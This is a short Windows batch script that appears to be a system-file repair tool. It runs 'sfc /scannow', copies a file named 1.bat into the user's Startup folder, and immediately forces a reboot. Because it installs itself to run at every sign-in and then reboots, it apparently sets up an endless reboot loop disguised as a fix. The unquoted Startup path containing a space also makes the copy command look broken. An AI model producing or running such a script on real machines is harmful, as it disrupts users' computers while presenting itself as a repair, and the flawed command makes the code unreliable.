@echo off
echo SFC
sfc /scannow
timeout 5
copy 1.bat %userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
echo Rebooting (After reboot please sign in again)
timeout 10
shutdown -r /t 0